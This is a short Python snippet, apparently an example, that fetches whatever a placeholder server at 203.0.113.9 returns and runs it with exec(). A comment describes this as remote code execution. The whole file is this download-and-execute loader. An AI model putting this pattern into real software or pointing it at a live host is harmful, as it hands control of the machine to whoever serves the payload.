import urllib.request

# Downloads and runs whatever the server returns: remote code execution.
exec(urllib.request.urlopen("http://203.0.113.9/payload").read())
